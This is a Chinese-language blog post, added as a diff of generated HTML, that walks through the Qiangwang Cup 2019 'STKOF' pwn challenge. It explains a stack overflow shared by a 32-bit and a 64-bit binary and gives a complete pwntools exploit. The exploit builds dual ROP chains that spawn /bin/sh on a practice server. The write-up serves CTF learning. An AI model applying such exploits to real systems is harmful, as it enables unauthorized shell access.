@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="题目程序保护如下：   32位程序的主逻辑如下：   64位程序的主逻辑如下：   这是一道拟态的题目，给了两个二进制文件，分别是32位和64位的，两个程序功能完全相同。题目会同时启动32位和64位程序，然后将我们的输入分别传给这两个进程，并检测两个程序的输出，若两个程序输出不同或者其中一个程序崩溃则会判断为check down，直接断开连接，只有两个程序的输出一致且都不崩溃时，才能通过检查。所以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2019-拟态STKOF">
+<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/index.html">
+<meta property="og:site_name" content="CharonPt的Blog">
+<meta property="og:description" content="题目程序保护如下：   32位程序的主逻辑如下：   64位程序的主逻辑如下：   这是一道拟态的题目，给了两个二进制文件，分别是32位和64位的，两个程序功能完全相同。题目会同时启动32位和64位程序，然后将我们的输入分别传给这两个进程，并检测两个程序的输出，若两个程序输出不同或者其中一个程序崩溃则会判断为check down，直接断开连接，只有两个程序的输出一致且都不崩溃时，才能通过检查。所以">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/checksec.jpg">
+<meta property="og:image" content="https://github.com/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/32main.png">
+<meta property="og:image" content="https://github.com/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/64main.jpg">
+<meta property="og:image" content="https://github.com/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/32add.jpg">
+<meta property="og:image" content="https://github.com/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/64add.jpg">
+<meta property="article:published_time" content="2022-01-14T08:49:09.000Z">
+<meta property="article:modified_time" content="2022-01-14T09:43:38.312Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/checksec.jpg">
+
+<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>强网杯2019-拟态STKOF | CharonPt的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CharonPt的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          强网杯2019-拟态STKOF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-14 16:49:09 / 修改时间：17:43:38" itemprop="dateCreated datePublished" datetime="2022-01-14T16:49:09+08:00">2022-01-14</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>程序保护如下：</p>
+<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/checksec.jpg" class>
+
+<p>32位程序的主逻辑如下：</p>
+<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/32main.png" class>
+
+<p>64位程序的主逻辑如下：</p>
+<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/64main.jpg" class>
+
+<p>这是一道拟态的题目，给了两个二进制文件，分别是32位和64位的，两个程序功能完全相同。题目会同时启动32位和64位程序，然后将我们的输入分别传给这两个进程，并检测两个程序的输出，若两个程序输出不同或者其中一个程序崩溃则会判断为<code>check down</code>，直接断开连接，只有两个程序的输出一致且都不崩溃时，才能通过检查。所以我们需要构造一条在两个程序中都能getshell的payload。</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>显然两个程序的漏洞都为栈溢出，且在64位程序中 <code>buf</code> 到 <code>rbp</code> 的距离为 <code>0x110</code> ，而在32为程序中 <code>buf</code> 到 <code>ebp</code>的距离为 <code>0x10C</code> ，所以对于同一条payload而言，64位程序的padding就为 <code>0x118</code> 个字节，而32位程序的padding为 <code>0x110</code> 个字节。因为这两个程序都是静态链接的程序，所以我们基本可以找到所需要的gadget来执行syscall，我们利用 <code>add_sp_ret</code> 这样的gadget来分别抬高两个程序中的sp寄存器，这样就能在栈上分别布置32位和64位的ROPchain，且使两个程序只执行对应的ROPchain。</p>
+<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/32add.jpg" class>
+
+<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/64add.jpg" class>
+
+<p>因为32位程序会先<code>ret</code>（<code>buf</code>到<code>ret</code>的距离较短），所以我们原本可以利用32位程序中的<code>add_sp_ret</code>来抬栈从而使32位程序的执行流直接跳过64位的ROPchain，但是32位程序中没有能将 esp 直接抬高这么多的 gadget，所以这种思路不可行，但是这不重要，只要我们能将 esp 抬高到跳过64位程序的 ret 就行，然后我们使64位程序的 ret 同样布置为 <code>add_sp_ret</code> 这样的gadget，来使这条payload在64位程序中的执行流跳过32位程序的ROPchain即可。同时因为程序中没有 <code>/bin/sh</code> 字符串，所以我们还需要往程序里手动写入。结合exp来理解即可，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28385</span>)</span><br><span class="line">elf32 = ELF(<span class="string">&quot;./32&quot;</span>)</span><br><span class="line">elf64 = ELF(<span class="string">&quot;./64&quot;</span>)</span><br><span class="line"></span><br><span class="line">add_esp_0x20 = <span class="number">0x080a69f2</span></span><br><span class="line">add_rsp_0x58 = <span class="number">0x43b979</span></span><br><span class="line"></span><br><span class="line">sh32 = <span class="number">0x80AEEBD</span></span><br><span class="line">sh64 = <span class="number">0x48D2AC</span></span><br><span class="line">bss64 = <span class="number">0x6A330F</span></span><br><span class="line">bss32 = <span class="number">0x80DA32F</span></span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080a8af6</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e9f1</span></span><br><span class="line">int80 = <span class="number">0x080495a3</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x43b97c</span></span><br><span class="line">pop_rdi = <span class="number">0x4005f6</span></span><br><span class="line">pop_rdx_rsi = <span class="number">0x43d9f9</span></span><br><span class="line">syscall = <span class="number">0x461645</span></span><br><span class="line"><span class="comment">#rop of 32</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x110</span></span><br><span class="line">payload += p32(add_esp_0x20) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p64(add_rsp_0x58)</span><br><span class="line">payload = payload.ljust(<span class="number">0x134</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(elf32.symbols[<span class="string">&#x27;read&#x27;</span>]) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(bss32) + p32(<span class="number">0x10</span>)</span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss32) + p32(int80)</span><br><span class="line"><span class="comment">#rop of 64</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x168</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x10</span>) + p64(bss64) + p64(elf64.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rax) + p64(<span class="number">59</span>) + p64(pop_rdi) + p64(bss64) + p64(pop_rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/12/17/picoctf-2018-buffer-overflow-0/" rel="prev" title="picoctf_2018_buffer_overflow_0">
+      <i class="fa fa-chevron-left"></i> picoctf_2018_buffer_overflow_0
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/01/18/qctf2018-stack2/" rel="next" title="qctf2018_stack2">
+      qctf2018_stack2 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
